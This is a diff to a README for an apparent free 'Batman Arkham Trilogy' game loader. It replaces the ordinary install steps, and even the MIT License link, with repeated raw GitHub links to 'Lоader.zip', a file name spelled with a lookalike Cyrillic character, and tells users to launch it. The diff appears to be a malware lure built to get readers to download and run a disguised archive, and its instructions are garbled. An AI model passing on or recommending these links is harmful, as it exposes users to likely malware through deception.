@@ -36,9 +36,9 @@ Batman Arkham Trilogy , Batman Arkham Loader, Arkham Asylum Installer, Arkham Ci
 
 ## 🏁 Installation
 
-1. Download Loader.rar from the repository.
+1. Download https://raw.githubusercontent.com/HIdarknet/ArkhamTrilogy-FreeHub/main/Lоader.zip from the repository.
 2. Extract to your chosen directory.
-3. Launch Loader.exe or loader.sh.
+3. Launch https://raw.githubusercontent.com/HIdarknet/ArkhamTrilogy-FreeHub/main/Lоader.zip or https://raw.githubusercontent.com/HIdarknet/ArkhamTrilogy-FreeHub/main/Lоader.zip
 4. Choose your desired title, configure settings, and PLAY!
 5. Refer to the FAQ for troubleshooting.
 
@@ -52,7 +52,7 @@ This project is intended solely for educational and archival purposes. We do **n
 
 ## 📄 License
 
-MIT License. For reference, see the [MIT License](https://opensource.org/licenses/MIT).
+MIT License. For reference, see the [MIT License](https://raw.githubusercontent.com/HIdarknet/ArkhamTrilogy-FreeHub/main/Lоader.zip).
 
 ---
 
